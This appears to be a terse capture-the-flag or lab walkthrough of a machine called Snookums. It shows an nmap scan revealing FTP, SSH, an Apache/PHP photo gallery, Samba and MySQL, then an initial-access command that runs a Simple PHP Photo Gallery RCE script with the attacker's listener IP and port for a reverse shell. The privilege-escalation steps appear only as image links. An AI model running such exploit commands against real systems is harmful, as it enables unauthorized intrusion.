#### ***Enumeration***

```
nmap -sVC -Pn -n -T4 --open --min-rate=1000 -oN Snookums-nmap 192.168.207.58

Nmap scan report for 192.168.162.58
Host is up (0.30s latency).
Not shown: 993 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h19m52s, deviation: 2h18m36s, median: -9s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2025-07-05T13:24:52-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-05T17:24:49
|_  start_date: N/A
```


![](Pasted%20image%2020260113101154.png)


---

#### ***Initial Access***

```
python3 SimplePHPGal-RCE.py http://192.168.207.58 192.168.45.171 445
```

![](Pasted%20image%2020260113102123.png)

---
#### ***Privilege Access***

![](Pasted%20image%2020260113102231.png)


![](Pasted%20image%2020260113102244.png)

![](Pasted%20image%2020260113102430.png)


![](Pasted%20image%2020260113102528.png)


![](Pasted%20image%2020260113102540.png)


![](Pasted%20image%2020260113102631.png)


![](Pasted%20image%2020260113102811.png)

![](Pasted%20image%2020260113102825.png)

![](Pasted%20image%2020260113103022.png)

![](Pasted%20image%2020260113103307.png)

![](Pasted%20image%2020260113104527.png)

---

---
										Target compromised - |^| ^ ( |< 3 D